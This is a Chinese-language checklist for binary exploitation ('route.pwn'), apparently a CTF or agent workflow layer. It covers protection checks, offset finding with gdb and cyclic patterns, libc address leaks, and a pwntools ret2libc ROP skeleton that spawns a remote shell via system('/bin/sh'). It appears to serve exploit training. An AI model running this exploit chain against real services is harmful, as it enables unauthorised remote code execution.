<!-- purge:layer route.pwn -->
## 二进制利用开工单（route.pwn）

### 1 保护与架构（先查再写）

```bash
file BIN; readelf -h BIN | grep -E 'Class|Machine|Entry'
readelf -lW BIN | grep -E 'GNU_STACK|GNU_RELRO'
readelf -d BIN | grep -E 'BIND_NOW|FLAGS'
```

没装 checksec 就用上面三条自己判：`GNU_STACK` 带 `RWE` = 栈可执行；有 `BIND_NOW` = 全 RELRO；`Type: DYN` + 无异构 = PIE。

### 2 找偏移

```bash
python3 -c "import sys;sys.stdout.write(b'A'*600)" > /tmp/p
gdb -q BIN -ex 'run < /tmp/p' -ex 'bt' -ex 'info registers rip rsp'
pwn cyclic 600 > /tmp/p2; gdb -q BIN -ex 'run < /tmp/p2' -ex 'info registers rip'
pwn cyclic -l 0x6161616a
```

macOS 上 gdb 基本不可用，换 `lldb ./BIN -o run -o bt -o 'register read x0 x1 sp'`。

### 3 泄漏 → 基址

- `puts(puts@got)` / `printf("%s", got)` 泄 libc
- 格式化字符串：`%p` 连发看栈，`%N$s` 定向读
- 泄漏值减已知符号偏移 = 基址。libc 必须**测**：`ldd BIN`、`strings libc.so.6 | grep 'GNU C Library'`

### 4 利用骨架

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
p = remote(HOST, PORT)
p.recvuntil(b'> ')
p.sendline(flat(b'A'*OFF, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main']))
libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.sym['puts']
p.sendline(flat(b'A'*OFF, pop_rdi+1, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym['system']))
p.interactive()
```

`pop_rdi+1` 是栈对齐补丁：system 内部 `movaps` 遇到 16 字节不齐会直接崩，症状是「地址全对但 shell 不起来」。

### 5 卡住时换面，不重复同一 payload

本地通远端不通 → 差在 libc 或环境：`patchelf --set-interpreter` 对齐本地库，或先拿一字节泄漏确认远端 base。三次不同 payload 崩在同一地址 → 偏移没错，问题在上游解析逻辑。判据是观测，不是猜。

<!-- /purge:layer -->
